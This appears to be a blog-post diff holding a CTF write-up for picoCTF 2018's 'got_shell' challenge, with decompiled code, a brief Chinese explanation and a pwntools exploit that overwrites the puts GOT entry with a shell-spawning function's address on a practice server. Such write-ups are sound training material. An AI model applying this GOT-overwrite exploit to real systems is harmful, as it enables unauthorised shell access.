@@ -1,0 +1,61 @@
+---
+layout: post
+title:  got_shell
+date:   2021-06-25 00:01:01 +0300
+image:  2021-06-25-woman.jpg
+tags:   [ctf,Pwn,picoctf2018]
+---
+
+main
+
+```assembly
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  _DWORD *v3; // [esp+14h] [ebp-114h]
+  int v4; // [esp+18h] [ebp-110h]
+  char s; // [esp+1Ch] [ebp-10Ch]
+  unsigned int v6; // [esp+11Ch] [ebp-Ch]
+
+  v6 = __readgsdword(0x14u);
+  setvbuf(_bss_start, 0, 2, 0);
+  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");
+  __isoc99_scanf("%x", &v3);
+  sprintf(&s, "Okay, now what value would you like to write to 0x%x", v3);
+  puts(&s);
+  __isoc99_scanf("%x", &v4);
+  sprintf(&s, "Okay, writing 0x%x to 0x%x", v4, v3);
+  puts(&s);
+  *v3 = v4;
+  puts("Okay, exiting now...\n");
+  exit(1);
+}
+```
+
+win
+
+```assembly
+int win()
+{
+  return system("/bin/sh");
+}
+```
+
+将win的地址覆写到puts_got或者exit_got，后面执行puts或exit的时候直接跳转到win函数来getshell
+
+```assembly
+from pwn import *
+
+io = remote("node4.buuoj.cn", 29996)
+
+puts_got = 0x804A00C
+win = 0x804854B
+
+io.recvuntil("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\n")
+io.sendline(hex(puts_got))
+
+io.recvuntil("Okay, now what value would you like to write to 0x804a00c\n")
+io.sendline(hex(win))
+
+io.interactive()
+```
+
